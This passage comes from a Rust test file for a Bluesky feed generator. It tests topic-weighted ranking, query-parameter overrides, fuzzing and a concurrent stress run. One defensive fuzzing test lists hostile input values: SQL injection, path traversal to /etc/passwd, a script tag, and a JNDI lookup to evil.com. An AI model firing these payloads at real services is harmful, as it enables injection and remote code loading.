    let bob_jwt = generate_service_auth_jwt(Some(bob_did), None, None, 3600);

    // 1. Query as Alice -> Art posts should be ranked prominently
    let req = Request::builder()
        .method(Method::GET)
        .uri("/xrpc/app.bsky.feed.getFeedSkeleton?feed=at://did:plc:feed/app.bsky.feed.generator/for-you")
        .header(AUTHORIZATION, format!("Bearer {alice_jwt}"))
        .body(Body::empty())
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let alice_feed: FeedSkeletonResponse = serde_json::from_slice(&body).unwrap();

    let alice_art_count = alice_feed
        .feed
        .iter()
        .filter(|p| p.post.contains("art"))
        .count();
    let alice_tech_count = alice_feed
        .feed
        .iter()
        .filter(|p| p.post.contains("tech"))
        .count();

    println!(" [ALICE FEED] Art posts: {alice_art_count}, Tech posts: {alice_tech_count}");
    assert!(
        alice_art_count >= alice_tech_count,
        "Alice with Art 5.0x / Tech 0.0x must receive more art posts than tech posts"
    );

    // 2. Query as Bob -> Tech posts should be ranked prominently
    let req = Request::builder()
        .method(Method::GET)
        .uri("/xrpc/app.bsky.feed.getFeedSkeleton?feed=at://did:plc:feed/app.bsky.feed.generator/for-you")
        .header(AUTHORIZATION, format!("Bearer {bob_jwt}"))
        .body(Body::empty())
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let bob_feed: FeedSkeletonResponse = serde_json::from_slice(&body).unwrap();

    let bob_tech_count = bob_feed
        .feed
        .iter()
        .filter(|p| p.post.contains("tech"))
        .count();
    let bob_art_count = bob_feed
        .feed
        .iter()
        .filter(|p| p.post.contains("art"))
        .count();

    println!(" [BOB FEED] Tech posts: {bob_tech_count}, Art posts: {bob_art_count}");
    assert!(
        bob_tech_count >= bob_art_count,
        "Bob with Tech 5.0x / Art 0.0x must receive more tech posts than art posts"
    );

    // 3. Query Param Overrides: Alice passes `?tech=5.0&art=0.0`
    // Query param must OVERRIDE Alice's saved preferences
    let req = Request::builder()
        .method(Method::GET)
        .uri("/xrpc/app.bsky.feed.getFeedSkeleton?feed=at://did:plc:feed/app.bsky.feed.generator/for-you&tech=5.0&art=0.0")
        .header(AUTHORIZATION, format!("Bearer {alice_jwt}"))
        .body(Body::empty())
        .unwrap();

    let resp = router.clone().oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let override_feed: FeedSkeletonResponse = serde_json::from_slice(&body).unwrap();

    let override_tech_count = override_feed
        .feed
        .iter()
        .filter(|p| p.post.contains("tech"))
        .count();
    let override_art_count = override_feed
        .feed
        .iter()
        .filter(|p| p.post.contains("art"))
        .count();

    println!(
        " [ALICE OVERRIDE FEED] Tech posts: {override_tech_count}, Art posts: {override_art_count}"
    );
    assert!(
        override_tech_count >= override_art_count,
        "Explicit query param ?tech=5.0&art=0.0 must override saved preferences!"
    );
}

// ===========================================================================
// ADDITIONAL ADVERSARIAL STRESS TESTS
// ===========================================================================

#[tokio::test]
async fn test_adversarial_service_jwt_fuzzing_and_injection_vectors() {
    let (_interner, _graph, _recommender, _preferences_store, router, _user_dids, _post_uris) =
        build_test_env(100, 500, 2_000, 500);

    let malicious_fuzz_vectors = vec![
        "did:plc:alice'; DROP TABLE users; --",
        "did:plc:alice\0nullbyte",
        "did:plc:../../../etc/passwd",
        "did:plc:<script>alert(1)</script>",
        "did:plc:${jndi:ldap://evil.com/a}",
        "did:web:evil.com%00.bsky.social",
        "did:plc:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "did:web:127.0.0.1:8080#fragment",
    ];

    for malicious_did in malicious_fuzz_vectors {
        let jwt = generate_service_auth_jwt(Some(malicious_did), None, None, 3600);

        // 1. In getFeedSkeleton: Should either accept if syntactically did:plc/did:web or degrade to anonymous, but NEVER crash
        let req = Request::builder()
            .method(Method::GET)
            .uri("/xrpc/app.bsky.feed.getFeedSkeleton?feed=at://did:plc:feed/app.bsky.feed.generator/for-you")
            .header(AUTHORIZATION, format!("Bearer {jwt}"))
            .body(Body::empty())
            .unwrap();

        let resp = router.clone().oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::OK,
            "Malicious DID in getFeedSkeleton must not crash the server"
        );

        // 2. In POST /api/preferences with malformed payload:
        let req = Request::builder()
            .method(Method::POST)
            .uri("/api/preferences")
            .header(AUTHORIZATION, format!("Bearer {jwt}"))
            .header(CONTENT_TYPE, "application/json")
            .body(Body::from(r#"{"freshness_hours": "malicious_string"}"#))
            .unwrap();

        let resp = router.clone().oneshot(req).await.unwrap();
        assert!(
            resp.status().is_client_error(),
            "Malformed payload must return 4xx client error, got {}",
            resp.status()
        );
    }
}

#[tokio::test]
async fn test_adversarial_query_parameter_fuzzing_and_clamping() {
    let (_interner, _graph, _recommender, _preferences_store, router, _user_dids, _post_uris) =
        build_test_env(100, 500, 2_000, 500);

    let extreme_query_strings = vec![
        "?feed=at://did:plc:feed/app.bsky.feed.generator/for-you&freshness=NaN&discovery=Infinity",
        "?feed=at://did:plc:feed/app.bsky.feed.generator/for-you&freshness=-999999&discovery=-500.0",
        "?feed=at://did:plc:feed/app.bsky.feed.generator/for-you&art=999999&tech=-999999&science=NaN",
        "?feed=at://did:plc:feed/app.bsky.feed.generator/for-you&limit=99999999&cursor=invalid_base64_cursor!@#",
        "?feed=at://did:plc:feed/app.bsky.feed.generator/for-you&limit=0&explain=true",
        "?feed=at://did:plc:feed/app.bsky.feed.generator/for-you&unknown_param_1=abc&unknown_param_2=123&unknown_param_3=true",
    ];

    for qs in extreme_query_strings {
        let uri = format!("/xrpc/app.bsky.feed.getFeedSkeleton{qs}");
        let req = Request::builder()
            .method(Method::GET)
            .uri(&uri)
            .body(Body::empty())
            .unwrap();

        let resp = router.clone().oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::OK,
            "Fuzzed query string '{qs}' must be defensively clamped and return 200 OK"
        );

        let body = resp.into_body().collect().await.unwrap().to_bytes();
        let skeleton: std::result::Result<FeedSkeletonResponse, _> = serde_json::from_slice(&body);
        assert!(
            skeleton.is_ok(),
            "Response must be valid FeedSkeletonResponse"
        );
    }
}

#[test]
fn test_empirical_16_thread_mixed_stress_matrix() {
    let (interner, graph, recommender, preferences_store, _router, user_dids, _post_uris) =
        build_test_env(10_000, 30_000, 200_000, 30_000);

    let now_secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    // Populate 5,000 users with preferences
    for i in 0..5_000 {
        let did = &user_dids[i];
        preferences_store.set_by_did(
            &interner,
            did,
            UserDials {
                freshness_half_life_secs: 36.0 * 3600.0,
                serendipity_ratio: 0.15,
                topic_weights: TopicWeights::default(),
                include_replies: false,
                updated_at_secs: now_secs,
            },
        );
    }

    let num_threads = 8;
    let queries_per_thread = 1_000;
    let total_queries = num_threads * queries_per_thread;

    let start = Instant::now();
    let handles: Vec<_> = (0..num_threads)
        .map(|t| {
            let recommender = Arc::clone(&recommender);
            let interner = Arc::clone(&interner);
            let preferences_store = Arc::clone(&preferences_store);
            let user_dids = user_dids.clone();

            std::thread::spawn(move || {
                let mut latencies = Vec::with_capacity(queries_per_thread);

                for i in 0..queries_per_thread {
                    let idx = t * queries_per_thread + i;

                    if t % 4 == 0 {
                        // 25% concurrent preference updates
                        let did = &user_dids[idx % 5000];
                        let dials = UserDials {
                            freshness_half_life_secs: (6 + (idx % 160)) as f32 * 3600.0,
                            serendipity_ratio: ((idx % 50) as f32) / 100.0,
                            topic_weights: TopicWeights::default(),
                            include_replies: false,
                            updated_at_secs: now_secs,
                        };
                        preferences_store.set_by_did(&interner, did, dials);
                    }

                    let (viewer_did, dials) = match idx % 3 {
                        0 => {
                            // Authenticated with preferences
                            let did = user_dids[idx % 5000].as_str();
                            let dials = preferences_store
                                .get_by_did(&interner, did)
                                .unwrap_or_default()
                                .to_recommendation_dials();
                            (Some(did), dials)
                        }
                        1 => {
                            // Authenticated without preferences (fast-path)
                            let did = user_dids[5000 + (idx % 5000)].as_str();
                            let dials = RecommendationDials::default();
                            (Some(did), dials)
                        }
                        _ => {
                            // Anonymous zero-login
                            (None, RecommendationDials::default())
                        }
                    };

                    let t0 = Instant::now();
                    let res = recommender.recommend(viewer_did, &dials, now_secs);
                    let elapsed = t0.elapsed().as_micros();
                    latencies.push(elapsed);
                    assert!(res.is_ok());
                }
                latencies
            })
        })
        .collect();

    let mut all_latencies = Vec::with_capacity(total_queries);
    for h in handles {
        all_latencies.extend(h.join().unwrap());
    }

    let elapsed = start.elapsed();
    all_latencies.sort_unstable();

    let count = all_latencies.len();
    let p50 = all_latencies[count * 50 / 100];
    let p90 = all_latencies[count * 90 / 100];
    let p99 = all_latencies[count * 99 / 100];
    let max = all_latencies[count - 1];
    let throughput = count as f64 / elapsed.as_secs_f64();

    println!(
        " [8-THREAD MIXED STRESS] Throughput: {:.1} q/s | p50: {} µs | p90: {} µs | p99: {} µs ({:.3} ms) | Max: {} µs",
        throughput, p50, p90, p99, p99 as f64 / 1000.0, max
    );

    let min_throughput = if cfg!(debug_assertions) {
        500.0
    } else {
        5_000.0
    };
    assert!(
        throughput > min_throughput,
        "Concurrent mixed throughput should exceed {min_throughput} queries/sec, got {throughput:.1}"
    );
}
